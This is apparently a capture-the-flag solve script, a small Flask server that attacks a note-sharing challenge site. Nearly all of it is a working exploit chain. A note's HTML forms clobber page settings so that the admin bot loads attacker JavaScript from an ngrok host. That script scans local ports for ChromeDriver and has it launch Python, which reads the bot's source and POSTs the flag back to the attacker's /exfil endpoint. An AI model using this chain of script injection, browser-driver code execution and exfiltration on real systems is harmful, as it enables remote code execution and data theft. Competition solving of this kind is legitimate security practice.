from flask import Flask, Response, request, redirect
import requests
import random
import string
# to use, forward port 8888 using ngrok, then set EXFIL_BASE_URL to the ngrok url and visit /solve to run the full chain
app = Flask(__name__)
REMOTE_BASE_URL = "https://pasteboard-7899034dca4b9f6c.chals.uoftctf.org"
s = requests.Session()
EXFIL_BASE_URL = "https://6c62365f2280.ngrok.app"

def create_note():
    url = f"{REMOTE_BASE_URL}/note/new"
    data = {
        "title": "Test Note",
        "body": f"""<form id="renderConfig">
  <input name="mode" value="go go squid">
</form>
<form id="errorReporter">
  <input name="path" value="{EXFIL_BASE_URL}/payload.js">
</form>"""
    }
    resp = s.post(url, data=data, allow_redirects=False)
    note_url = resp.headers.get("Location")
    print(f"Created note at {note_url}")
    return note_url

def report_note(note_url):
    url = f"{REMOTE_BASE_URL}/report"
    data = {
        "url": note_url
    }
    s.post(url, data=data)
    print(f"Reported note {note_url} for review")
    
@app.route('/payload.js')
def payload():
    js = r'''
    let options = {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        capabilities: {
        alwaysMatch: {
            browserName: "chrome",
            "goog:chromeOptions": {
            binary: "/usr/local/bin/python",
            args: [`-cimport re,urllib.request,urllib.parse;urllib.request.urlopen(urllib.request.Request("<EXFIL>",urllib.parse.urlencode({"flag":re.search(r"uoftctf\{[^}]+\}",open("/app/bot.py").read()).group(0)}).encode()))`],
            },
        },
        },
    }),
    };
    for (let port = 32768; port < 61000; port++) {
    fetch(`http://127.0.0.1:${port}/session`, options);
    }

    '''.replace("<EXFIL>", f"{EXFIL_BASE_URL}/exfil")
    return Response(js, mimetype='application/javascript')
    
@app.route('/exfil', methods=['POST'])
def exfil():
    flag = request.form.get("flag")
    print(f"Exfiltrated flag: {flag}")
    return "", 204

@app.route('/solve')
def solve():
    note_url = create_note()
    report_note(note_url)
    return "Exploit sent! Check the server logs for exfiltrated data."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888,debug=True)